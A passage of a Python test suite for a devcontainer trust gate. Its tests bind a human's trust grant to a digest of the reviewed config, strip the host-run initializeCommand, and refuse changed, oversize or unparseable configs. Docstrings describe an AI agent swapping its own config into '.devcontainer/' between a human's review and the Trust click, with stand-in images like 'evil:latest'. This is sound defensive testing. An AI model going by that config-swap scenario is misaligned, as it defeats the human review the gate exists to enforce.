        a = tmp_path / "a"
        b = tmp_path / "b"
        for p in (a, b):
            p.mkdir()
            _write_primary(p)
        devc.grant_trust(a)
        assert devc.is_trusted(a) is True
        assert devc.is_trusted(b) is False

    def test_is_trusted_false_without_config(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        assert devc.is_trusted(project) is False

    def test_grant_without_config_raises(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError):
            devc.grant_trust(project)

    def test_corrupt_trust_file_is_treated_as_empty(self, tmp_path: Path, trust_home: Path) -> None:
        store = trust_home / "devcontainers" / "trust.json"
        store.parent.mkdir(parents=True, exist_ok=True)
        store.write_bytes(b"{not json")
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        assert devc.is_trusted(project) is False
        # ...and a later grant still succeeds, overwriting the garbage.
        devc.grant_trust(project)
        assert devc.is_trusted(project) is True

    def test_write_is_atomic_replace_with_no_tmp_residue(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The store lands via a rename from a temp file in the same directory.

        Readers never see a half-written file, and no temp file is left behind.
        The temp NAME is deliberately not asserted: it comes from ``mkstemp`` so
        that concurrent writers cannot collide on one staging path, which a fixed
        ``trust.json.tmp`` sibling did allow. ``TestTrustStoreTransactions``
        pins that uniqueness; this test pins the atomic-rename shape.
        """
        calls: list[tuple[str, str]] = []
        real_replace = os.replace

        def spy(src, dst, *a, **kw):  # type: ignore[no-untyped-def]
            calls.append((str(src), str(dst)))
            return real_replace(src, dst, *a, **kw)

        monkeypatch.setattr(os, "replace", spy)

        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        store = trust_home / "devcontainers" / "trust.json"
        assert len(calls) == 1
        src, dst = calls[0]
        assert dst == str(store)
        # Same directory, so the rename is atomic rather than cross-device.
        assert Path(src).parent == store.parent
        assert src != str(store.with_suffix(".tmp")), "back to a fixed temp name"
        assert store.is_file()
        assert not list(store.parent.glob("*.tmp"))
        # The lock sidecar is expected company; nothing else should appear.
        assert sorted(p.name for p in store.parent.iterdir()) == [
            "trust.json",
            "trust.lock",
        ]


# ---------------------------------------------------------------------------
# grant_trust: binding the grant to the reviewed bytes
# ---------------------------------------------------------------------------


class TestGrantTrustExpectedDigest:
    """``expected_digest`` closes the preview→grant window.

    Without it the digest recorded by ``grant_trust`` is computed from whatever
    is on disk at grant time, so an agent that rewrote ``.devcontainer/``
    between the human reading the preview and clicking Trust would have its OWN
    configuration authorized.
    """

    def test_matching_digest_grants(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        assert devc.grant_trust(project, reviewed) == reviewed
        assert devc.is_trusted(project) is True

    def test_stale_digest_raises_and_writes_no_grant(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """REVERT-VERIFIED against the ``expected_digest`` guard in
        ``devcontainer.grant_trust``: drop the raise and the config the human
        never saw gets trusted, so ``is_trusted`` flips to True and the store
        grows an entry. The security property is the ABSENCE of a grant, not
        merely the exception — a raise after the write would still leave the
        swapped config authorized."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)

        # The agent swaps in its own configuration after the preview was read.
        cfg.write_bytes(json.dumps({"name": "kirocrew-dev", "image": "evil:latest"}).encode())
        with pytest.raises(devc.DevcontainerConfigChanged):
            devc.grant_trust(project, reviewed)

        assert devc.is_trusted(project) is False
        assert not (trust_home / "devcontainers" / "trust.json").exists()

    def test_stale_digest_leaves_an_existing_grant_untouched(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """A refused grant must not disturb the store's other entries either."""
        other = tmp_path / "other"
        other.mkdir()
        _write_primary(other)
        devc.grant_trust(other)
        store = trust_home / "devcontainers" / "trust.json"
        before = store.read_bytes()

        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        reviewed = devc.config_digest(cfg)
        cfg.write_bytes(json.dumps({"name": "x", "image": "evil:latest"}).encode())
        with pytest.raises(devc.DevcontainerConfigChanged):
            devc.grant_trust(project, reviewed)

        assert store.read_bytes() == before
        assert os.path.realpath(str(project)) not in json.loads(store.read_text(encoding="utf-8"))

    def test_config_changed_is_a_devcontainer_error(self) -> None:
        """Subclassing keeps every existing ``except DevcontainerError`` handler
        (up(), the rebuild endpoint, the status path) catching it."""
        assert issubclass(devc.DevcontainerConfigChanged, devc.DevcontainerError)
        assert issubclass(devc.DevcontainerConfigChanged, RuntimeError)

    def test_none_digest_still_grants(self, tmp_path: Path, trust_home: Path) -> None:
        """Deliberate no-preview callers (CLI, tests) keep the unbound form."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)

        assert devc.grant_trust(project) == devc.config_digest(cfg)
        assert devc.grant_trust(project, None) == devc.config_digest(cfg)
        assert devc.is_trusted(project) is True

    def test_no_config_raises_plain_error_not_config_changed(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Absent config is checked BEFORE the digest comparison, so the caller
        still gets the 404-mapped error rather than a 409-mapped one."""
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError) as excinfo:
            devc.grant_trust(project, "deadbeef")
        assert not isinstance(excinfo.value, devc.DevcontainerConfigChanged)


# ---------------------------------------------------------------------------
# config_preview
# ---------------------------------------------------------------------------


class TestConfigPreview:
    def test_returns_digest_raw_and_trusted(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)

        preview = devc.config_preview(project)
        assert preview["config_path"] == str(cfg)
        assert preview["digest"] == devc.config_digest(cfg)
        assert preview["raw"] == _SAMPLE_CONFIG
        assert preview["name"] == "kirocrew-dev"
        assert preview["image"] == "mcr.io/devcontainers/base:ubuntu"
        assert preview["trusted"] is False

        devc.grant_trust(project)
        assert devc.config_preview(project)["trusted"] is True

    def test_tolerates_jsonc_line_comments(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        body = (
            "// Kiro Crew dev container\n"
            "{\n"
            '  "name": "commented",\n'
            "  // the base image\n"
            '  "image": "ubuntu:24.04"\n'
            "}\n"
        )
        _write_primary(project, body)

        preview = devc.config_preview(project)
        assert preview["name"] == "commented"
        assert preview["image"] == "ubuntu:24.04"
        # raw is verbatim, comments included — the human sees what they trust.
        assert preview["raw"] == body

    @pytest.mark.parametrize(
        "body,label",
        [
            ('{"name": "broken",}', "trailing comma"),
            ('/* header */\n{"name": "broken"}', "block comment"),
            ('{"name": "broken"', "truncated object"),
            ('["not", "an", "object"]', "json array"),
        ],
    )
    def test_unparseable_config_fails_closed(
        self, tmp_path: Path, trust_home: Path, body: str, label: str
    ) -> None:
        """INVERTED PREMISE. This test previously asserted that an unparseable
        config still previewed its raw bytes with ``name``/``image`` as None,
        on the reasoning that malformed jsonc is the CLI's problem and a human
        should still get to read the file. That is no longer sound: the build
        inputs named by the config now have to be proven to sit inside the
        hashed tree (``assert_build_inputs_contained``), and a config that
        cannot be parsed is a config whose build inputs cannot be enumerated.
        Previewing it anyway would show a reassuring card for content whose
        ``build.dockerfile`` might point anywhere, and granting from that card
        would authorize an unhashed input. So ``_parse_jsonc`` raises, and both
        the digest and the preview refuse rather than admitting it.

        Block comments and trailing commas are legal jsonc that the stripper
        does not handle, so this is a real (documented) narrowing of what is
        accepted, not only a guard against corruption — hence the message
        naming the limitation, asserted here.

        REVERT-VERIFIED against ``_parse_jsonc``'s ``raise DevcontainerError``:
        swapped for ``return {}`` and 4 of these 5 cases failed (the json-array
        case still refuses via the separate ``isinstance`` guard); source md5
        unchanged after restoring.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project, body)

        with pytest.raises(devc.DevcontainerError, match="could not be parsed|must be a JSON"):
            devc.config_preview(project)
        # Fails closed at the digest too, so the refusal cannot be sidestepped
        # by any caller that skips the preview (trust grant, up(), is_trusted).
        with pytest.raises(devc.DevcontainerError, match="could not be parsed|must be a JSON"):
            devc.config_digest(cfg)
        with pytest.raises(devc.DevcontainerError):
            devc.grant_trust(project)
        assert devc.is_trusted(project) is False

    def test_non_utf8_config_fails_closed(self, tmp_path: Path, trust_home: Path) -> None:
        """Bytes that are not UTF-8 are refused for the same reason, rather
        than being decoded with replacement characters and parsed as whatever
        survives."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = project / ".devcontainer" / "devcontainer.json"
        cfg.parent.mkdir(parents=True)
        cfg.write_bytes(b'{"name": "\xff\xfe"}')

        with pytest.raises(devc.DevcontainerError, match="could not be parsed"):
            devc.config_digest(cfg)
        with pytest.raises(devc.DevcontainerError, match="could not be parsed"):
            devc.config_preview(project)

    def test_an_oversize_config_is_refused_rather_than_capped(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """INVERTED PREMISE. This previously asserted ``raw`` was truncated to
        65536 bytes.

        Truncating meant the digest covered bytes the prompt never displayed, so
        a grant could authorize fields hidden past the cut. The cap is now a
        refusal threshold: either the reviewer sees the whole config or it cannot
        be trusted. ``TestOversizeConfigRefused`` covers the gates and the
        under-cap case.
        """
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project, "{" + " " * 100_000 + "}")
        with pytest.raises(devc.DevcontainerError, match="larger than"):
            devc.config_preview(project)

    def test_missing_config_raises(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError):
            devc.config_preview(project)

    def test_digest_matches_config_digest_for_the_same_tree(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """ATOMICITY: the shown text and the returned digest come from ONE read.

        The card's digest is what the user's Trust click authorizes, so it must
        describe the bytes the card displayed. Both are now derived from a
        single ``_read_config_tree`` result, and the digest that comes out
        equals the one ``config_digest`` computes independently for an unchanged
        tree — which is what lets ``grant_trust(project, preview["digest"])``
        succeed at all.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project, json.dumps({"build": {"dockerfile": "Dockerfile"}}))
        _write_input(cfg, "Dockerfile")
        _write_input(cfg, "scripts/post-create.sh", b"#!/bin/sh\necho hi\n")

        preview = devc.config_preview(project)
        assert preview["digest"] == devc.config_digest(cfg)
        assert preview["raw"] == cfg.read_bytes().decode()
        # And the pair round-trips through the digest-bound grant.
        assert devc.grant_trust(project, preview["digest"]) == preview["digest"]

    def test_digest_covers_siblings_the_raw_text_does_not_show(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """A sibling edit moves the digest while ``raw`` is byte-identical.

        This is why ``other_inputs`` exists: the human reads only the json, so
        the prompt has to say what else the grant covers.
        """
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project, json.dumps({"build": {"dockerfile": "Dockerfile"}}))
        dockerfile = _write_input(cfg, "Dockerfile")
        first = devc.config_preview(project)

        dockerfile.write_bytes(b"FROM ubuntu:24.04\nRUN echo changed\n")
        second = devc.config_preview(project)

        assert second["raw"] == first["raw"]
        assert second["digest"] != first["digest"]

    def test_other_inputs_lists_the_tree_beyond_devcontainer_json(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        _write_input(cfg, "Dockerfile")
        _write_input(cfg, "scripts/post-create.sh", b"#!/bin/sh\n")

        preview = devc.config_preview(project)
        # Sorted, relative to .devcontainer/, and never the config itself.
        assert preview["other_inputs"] == ["Dockerfile", "scripts/post-create.sh"]
        assert cfg.name not in preview["other_inputs"]

    def test_other_inputs_is_empty_for_a_lone_config(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        assert devc.config_preview(project)["other_inputs"] == []
        # Root layout has no directory to enumerate at all.
        project2 = tmp_path / "proj2"
        project2.mkdir()
        _write_fallback(project2)
        assert devc.config_preview(project2)["other_inputs"] == []

    def test_other_inputs_is_capped(self, tmp_path: Path, trust_home: Path) -> None:
        """A generated tree must not make the payload unbounded."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        for i in range(70):
            _write_input(cfg, f"f{i:03d}.txt", b"x")
        assert len(devc.config_preview(project)["other_inputs"]) == 64


# ---------------------------------------------------------------------------
# write_build_config: the sanitized config the build actually consumes
# ---------------------------------------------------------------------------


_HOST_HOOK = "echo ran-on-the-host"


class TestWriteBuildConfig:
    """The CLI is pointed at a sanitized, digest-verified copy — never the file.

    Two properties, both security-relevant:

    * ``initializeCommand`` is the ONE lifecycle hook the spec runs on the HOST
      rather than in the container. Honoring it would let the project's config
      execute outside the container entirely, which is the boundary the feature
      exists to provide. It is stripped from the copy, and ``--override-config``
      means the CLI never parses the original.
    * The copy is written only after re-deriving the digest from a fresh read,
      so a tree that moved after the trust check raises instead of building.

    REVERT-VERIFIED — pins ``parsed.pop(_HOST_LIFECYCLE_KEY, None)`` and the
    ``if _digest_entries(...) != digest: raise DevcontainerConfigChanged`` block
    in ``write_build_config``. Drop the pop and
    ``test_initialize_command_is_stripped`` fails (the key survives into the
    written copy, so the CLI would run it on the host). Drop the digest
    comparison and ``test_changed_config_raises_config_changed`` /
    ``test_changed_sibling_input_raises_config_changed`` fail (a swapped tree is
    written out and built).

    Verified: ``pop`` -> ``get`` failed 4 tests; ``if _digest_entries(...) !=
    digest`` -> ``if False`` failed 3. Source md5 unchanged after each restore.
    """

    @staticmethod
    def _project(tmp_path: Path, cfg_obj: dict) -> tuple[Path, Path]:
        project = tmp_path / "proj"
        project.mkdir()
        return project, _write_primary(project, json.dumps(cfg_obj))

    def test_initialize_command_is_stripped(self, tmp_path: Path, trust_home: Path) -> None:
        project, cfg = self._project(
            tmp_path,
            {
                "name": "kirocrew-dev",
                "image": "ubuntu:24.04",
                "initializeCommand": _HOST_HOOK,
            },
        )
        out = devc.write_build_config(str(project), devc.config_digest(cfg))

        written = json.loads(out.read_text(encoding="utf-8"))
        assert "initializeCommand" not in written
        assert _HOST_HOOK not in out.read_text(encoding="utf-8")
        # The original is untouched: sanitizing is done on the COPY, so the
        # project file's bytes still hash to the trusted digest.
        assert "initializeCommand" in json.loads(cfg.read_bytes().decode())

    def test_every_other_key_is_preserved(self, tmp_path: Path, trust_home: Path) -> None:
        """Parity, not a sandbox: only the host-executing hook is removed.

        The in-container lifecycle hooks, mounts and runArgs are exactly what
        "honor the repo's config in full" means, so a fix that stripped more than
        ``initializeCommand`` would break the feature's premise. Asserted
        key-by-key against the original.

        ``features`` was in this fixture and is deliberately no longer: it is now
        refused outright, because its metadata is fetched from a registry and
        merged at build time, so no screen here and no digest can describe what
        would actually run. See ``TestFeaturesAreRefused``.
        """
        original = {
            "name": "kirocrew-dev",
            "image": "ubuntu:24.04",
            "initializeCommand": _HOST_HOOK,
            "onCreateCommand": "echo on-create",
            "postCreateCommand": "echo post-create",
            "postStartCommand": ["sh", "-c", "echo post-start"],
            "mounts": ["source=vol,target=/data,type=volume"],
            "runArgs": ["--cap-add=SYS_PTRACE"],
            "remoteUser": "vscode",
            "customizations": {"vscode": {"extensions": ["ms-python.python"]}},
        }
        project, cfg = self._project(tmp_path, original)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))

        written = json.loads(out.read_text(encoding="utf-8"))
        expected = {k: v for k, v in original.items() if k != "initializeCommand"}
        # runArgs is compared by PREFIX: the DoS ceilings are appended to it,
        # since a containerized agent skips the host cgroup scope. The project's
        # own flags must survive ahead of them.
        assert written["runArgs"][: len(expected["runArgs"])] == expected["runArgs"]
        assert "--pids-limit" in written["runArgs"]
        assert written["mounts"][: len(expected["mounts"])] == expected["mounts"]
        assert any("/tmp/kirocrew-mcp-bridge" in str(m) for m in written["mounts"])
        assert any(devc.AUTH_CONTAINER_DIR in str(m) for m in written["mounts"])
        assert any("/.kiro/agents" in str(m) for m in written["mounts"])
        skip = {"runArgs", "mounts"}
        assert {k: v for k, v in written.items() if k not in skip} == {
            k: v for k, v in expected.items() if k not in skip
        }

    def test_config_without_the_hook_round_trips_unchanged(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The common case is perturbed ONLY by the injected DoS ceilings.

        The sanitized copy is no longer a byte round-trip, because a containerized
        agent skips the host cgroup scope and the ceilings have to be re-applied
        as container limits. Every key the project declared is still untouched --
        that is what this pins, rather than a bare equality that would now also
        pass if sanitization started dropping keys.
        """
        original = {"name": "kirocrew-dev", "image": "ubuntu:24.04"}
        project, cfg = self._project(tmp_path, original)
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        written = json.loads(out.read_text(encoding="utf-8"))
        for key, value in original.items():
            assert written[key] == value
        assert set(written) - set(original) == {"runArgs", "mounts"}
        assert "--pids-limit" in written["runArgs"]
        assert any("/tmp/kirocrew-mcp-bridge" in str(m) for m in written["mounts"])
        assert any(devc.AUTH_CONTAINER_DIR in str(m) for m in written["mounts"])
        assert any("/.kiro/agents" in str(m) for m in written["mounts"])

    def test_output_lives_under_the_gateway_data_home_keyed_by_digest(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Not in the project: the agent can write there, and the whole point is
        that the CLI parses bytes the agent cannot reach after the grant."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        digest = devc.config_digest(cfg)
        out = devc.write_build_config(str(project), digest)

        assert out == _expected_build_root(trust_home, project) / digest[:24] / "devcontainer.json"
        assert out.is_file()
        # Written via os.replace, so no .tmp sibling is left for the CLI to see.
        assert sorted(p.name for p in out.parent.iterdir()) == ["devcontainer.json"]
        assert project not in out.parents

    def test_repeated_calls_are_idempotent(self, tmp_path: Path, trust_home: Path) -> None:
        """up() calls this on every (re)build for an unchanged config."""
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        digest = devc.config_digest(cfg)
        first = devc.write_build_config(str(project), digest)
        body = first.read_bytes()
        assert devc.write_build_config(str(project), digest) == first
        assert first.read_bytes() == body

    def test_changed_config_raises_config_changed(self, tmp_path: Path, trust_home: Path) -> None:
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        digest = devc.config_digest(cfg)

        cfg.write_bytes(json.dumps({"image": "attacker/img:latest"}).encode())
        with pytest.raises(devc.DevcontainerConfigChanged, match="changed after the trust check"):
            devc.write_build_config(str(project), digest)
        # Nothing was written for the stale digest, so no build can pick it up.
        assert not (_expected_build_root(trust_home, project) / digest[:24]).exists()

    def test_changed_sibling_input_raises_config_changed(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The sharp case: devcontainer.json is byte-identical, and only a
        referenced Dockerfile moved. A json-only re-check would pass this."""
        project, cfg = self._project(tmp_path, {"build": {"dockerfile": "Dockerfile"}})
        dockerfile = _write_input(cfg, "Dockerfile")
        digest = devc.config_digest(cfg)

        dockerfile.write_bytes(b"FROM ubuntu:24.04\nRUN echo changed\n")
        assert cfg.read_bytes() == json.dumps({"build": {"dockerfile": "Dockerfile"}}).encode()
        with pytest.raises(devc.DevcontainerConfigChanged):
            devc.write_build_config(str(project), digest)

    def test_added_sibling_input_raises_config_changed(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        project, cfg = self._project(tmp_path, {"image": "ubuntu:24.04"})
        digest = devc.config_digest(cfg)
        _write_input(cfg, "post-create.sh", b"#!/bin/sh\necho added\n")
        with pytest.raises(devc.DevcontainerConfigChanged):
            devc.write_build_config(str(project), digest)

    def test_escaping_build_input_is_refused_here_too(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Containment is re-asserted at write time, not trusted from the
        earlier digest call — this is the last gate before the CLI runs."""
        project, cfg = self._project(tmp_path, {"build": {"dockerfile": "Dockerfile"}})
        _write_input(cfg, "Dockerfile")
        digest = devc.config_digest(cfg)

        # Swap to an escaping input; the digest changes, so the mismatch fires
        # first. Recompute to isolate the containment refusal specifically.
        cfg.write_bytes(json.dumps({"build": {"dockerfile": "../Dockerfile"}}).encode())
        with pytest.raises(devc.DevcontainerError):
            devc.write_build_config(str(project), digest)
        with pytest.raises(devc.DevcontainerError, match="resolves outside .devcontainer"):
            devc.config_digest(cfg)

    def test_missing_config_raises_plain_error(self, tmp_path: Path, trust_home: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError) as exc:
            devc.write_build_config(str(project), "d" * 64)
        assert not isinstance(exc.value, devc.DevcontainerConfigChanged)

    def test_root_layout_is_sanitized_too(self, tmp_path: Path, trust_home: Path) -> None:
        """``.devcontainer.json`` takes the same path — the host hook is not a
        directory-layout-only concern."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_fallback(
            project, json.dumps({"image": "ubuntu:24.04", "initializeCommand": _HOST_HOOK})
        )
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        written = json.loads(out.read_text(encoding="utf-8"))
        assert written["image"] == "ubuntu:24.04"
        assert devc._HOST_LIFECYCLE_KEY not in written


# ---------------------------------------------------------------------------
# exec_argv
# ---------------------------------------------------------------------------


class TestExecArgv:
    def _split(self, argv: list[str]) -> tuple[list[str], list[str]]:
        """Split at the ``sh -c <script> sh`` boundary -> (prefix, inner)."""
        idx = argv.index("sh")
        return argv[:idx], argv[idx:]

    def test_docker_exec_interactive_prefix(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(), ["kiro-cli", "acp"], env={}, exec_id="e1"
        )
        assert argv[:3] == ["docker", "exec", "-i"]

    def test_remote_user_forwarded_only_when_set(self) -> None:
        mgr = devc.DevcontainerManager()
        with_user = mgr.exec_argv(_info(remote_user="vscode"), ["x"], env={}, exec_id="e1")
        assert "-u" in with_user
        assert with_user[with_user.index("-u") + 1] == "vscode"

        without = mgr.exec_argv(_info(remote_user=""), ["x"], env={}, exec_id="e1")
        assert "-u" not in without

    def test_workdir_defaults_to_remote_workspace_folder(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(remote_workspace_folder="/workspaces/proj"), ["x"], env={}, exec_id="e1"
        )
        assert argv[argv.index("-w") + 1] == "/workspaces/proj"

    def test_explicit_workdir_overrides(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(), ["x"], env={}, exec_id="e1", workdir="/workspaces/proj/sub"
        )
        assert argv[argv.index("-w") + 1] == "/workspaces/proj/sub"

    def test_env_forwarded_with_dash_e_including_exec_marker(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(),
            ["x"],
            env={"KIROCREW_SESSION_KEY": "sk-1", "KIROCREW_CHANNEL_ID": "C1"},
            exec_id="deadbeef",
        )
        pairs = {argv[i + 1] for i, tok in enumerate(argv) if tok == "-e"}
        assert "KIROCREW_SESSION_KEY=sk-1" in pairs
        assert "KIROCREW_CHANNEL_ID=C1" in pairs
        # docker exec does not inherit the host env: the marker must be explicit.
        assert f"{devc.DEVCONTAINER_EXEC_ENV}=deadbeef" in pairs

    def test_caller_env_is_not_mutated(self) -> None:
        env: dict[str, str] = {}
        devc.DevcontainerManager().exec_argv(_info(), ["x"], env=env, exec_id="e1")
        assert env == {}

    def test_container_id_precedes_the_shell_argv(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(container_id="abc123"), ["x"], env={}, exec_id="e1"
        )
        prefix, inner = self._split(argv)
        assert prefix[-1] == "abc123"
        assert inner[0] == "sh"
        assert inner[1] == "-c"

    def test_preamble_records_pidfile_and_prefers_setsid(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(), ["kiro-cli", "acp"], env={}, exec_id="abc"
        )
        script = argv[argv.index("-c") + 1]
        assert "echo $$ > /tmp/kirocrew-exec/abc.pid" in script
        assert "mkdir -p /tmp/kirocrew-exec" in script
        # setsid gives kill_exec() a process GROUP to signal; plain exec is the
        # fallback on images without it.
        assert 'exec setsid "$@"' in script
        assert 'exec "$@"' in script
        assert "command -v setsid" in script

    def test_inner_argv_appended_after_the_sh_argv_name(self) -> None:
        """``sh -c <script> sh <inner...>`` — the second 'sh' is $0, so the
        inner argv starts at $1 and is what "$@" expands to."""
        inner_argv = ["kiro-cli", "acp", "--agent", "kirocrew"]
        argv = devc.DevcontainerManager().exec_argv(_info(), inner_argv, env={}, exec_id="e1")
        assert argv[-len(inner_argv) - 1] == "sh"  # $0 placeholder
        assert argv[-len(inner_argv) :] == inner_argv

    def test_full_argv_order(self) -> None:
        argv = devc.DevcontainerManager().exec_argv(
            _info(container_id="cid", remote_user="node", remote_workspace_folder="/w"),
            ["kiro-cli", "acp"],
            env={"A": "1"},
            exec_id="x1",
        )
        script = argv[argv.index("-c") + 1]
        assert argv == [
            "docker",
            "exec",
            "-i",
            "-u",
            "node",
            "-w",
            "/w",
            "-e",
            "A=1",
            "-e",
            f"{devc.DEVCONTAINER_EXEC_ENV}=x1",
            "cid",
            "sh",
            "-c",
            script,
            "sh",
            "kiro-cli",
            "acp",
        ]


# ---------------------------------------------------------------------------
# _parse_up_output
# ---------------------------------------------------------------------------


class TestParseUpOutput:
    def test_picks_last_object_with_outcome_from_interleaved_log(self) -> None:
        stdout = "\n".join(
            [
                '{"type":"text","level":2,"text":"Resolving Dev Container"}',
                "not json at all",
                '{"outcome":"error","message":"stale record"}',
                '{"type":"text","level":2,"text":"Running lifecycle hooks"}',
                '{"outcome":"success","containerId":"abc123",'
                '"remoteUser":"vscode","remoteWorkspaceFolder":"/workspaces/p"}',
                '{"type":"text","level":2,"text":"done"}',
            ]
        )
        result = devc.DevcontainerManager._parse_up_output(stdout)
        assert result["outcome"] == "success"
        assert result["containerId"] == "abc123"
        assert result["remoteWorkspaceFolder"] == "/workspaces/p"

    def test_trailing_log_records_do_not_hide_the_result(self) -> None:
        stdout = (
            '{"outcome":"success","containerId":"c1"}\n'
            '{"type":"text","text":"tail"}\n'
            '{"type":"text","text":"more tail"}\n'
        )
        assert devc.DevcontainerManager._parse_up_output(stdout)["containerId"] == "c1"

    def test_empty_dict_on_garbage(self) -> None:
        assert devc.DevcontainerManager._parse_up_output("boom: not json\n") == {}

    def test_empty_dict_on_empty_stdout(self) -> None:
        assert devc.DevcontainerManager._parse_up_output("") == {}
        assert devc.DevcontainerManager._parse_up_output("   \n\n") == {}

    def test_empty_dict_when_no_object_carries_outcome(self) -> None:
        stdout = '{"type":"text","text":"a"}\n{"type":"text","text":"b"}\n'
        assert devc.DevcontainerManager._parse_up_output(stdout) == {}

    def test_json_array_line_is_ignored(self) -> None:
        """Only objects count — a bare array can never be the result record."""
        assert devc.DevcontainerManager._parse_up_output('["outcome"]\n') == {}


# ---------------------------------------------------------------------------
# up() trust gate
# ---------------------------------------------------------------------------


class TestUpTrustGate:
    @pytest.fixture
    def no_subprocess(self, monkeypatch: pytest.MonkeyPatch) -> list[tuple]:
        """Any spawn attempt fails the test rather than reaching Docker."""
        spawned: list[tuple] = []

        async def boom(*argv, **kw):  # type: ignore[no-untyped-def]
            spawned.append(argv)
            raise AssertionError(f"unexpected subprocess spawn: {argv!r}")

        monkeypatch.setattr(asyncio, "create_subprocess_exec", boom)
        return spawned

    @pytest.mark.asyncio
    async def test_untrusted_raises_before_any_subprocess(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_revoked_grant_raises_again(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)
        devc.revoke_trust(project)

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_revoke_while_waiting_for_the_project_lock_is_honored(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        """A session that passed the grant check, then queued behind the lock,
        must not still receive the container after trust is withdrawn.

        The pre-lock check is fail-fast only. Without a second check after the
        lock, a revoke timed during the wait (or during a sibling's build)
        would hand the container out anyway.
        """
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)
        mgr = devc.DevcontainerManager()
        key = os.path.realpath(str(project))
        lock = mgr._lock_for(key)
        await lock.acquire()
        task = asyncio.create_task(mgr.up(project))
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline and not task.done():
            await asyncio.sleep(0.01)
        assert not task.done(), "up() finished before it could wait on the lock"
        devc.revoke_trust(project)
        lock.release()
        with pytest.raises(devc.DevcontainerNotTrusted):
            await task
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_edited_config_invalidates_trust_before_spawn(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        """The trust-then-edit race is closed at the gate, not after the build."""
        project = tmp_path / "proj"
        project.mkdir()
        cfg = _write_primary(project)
        devc.grant_trust(project)
        cfg.write_bytes(b'{"image": "attacker/img:latest"}')

        with pytest.raises(devc.DevcontainerNotTrusted):
            await devc.DevcontainerManager().up(project)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_missing_config_raises_plain_error_before_spawn(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        with pytest.raises(devc.DevcontainerError) as exc:
            await devc.DevcontainerManager().up(project)
        assert not isinstance(exc.value, devc.DevcontainerNotTrusted)
        assert no_subprocess == []

    @pytest.mark.asyncio
    async def test_rebuild_is_also_trust_gated(
        self, tmp_path: Path, trust_home: Path, no_subprocess: list[tuple]
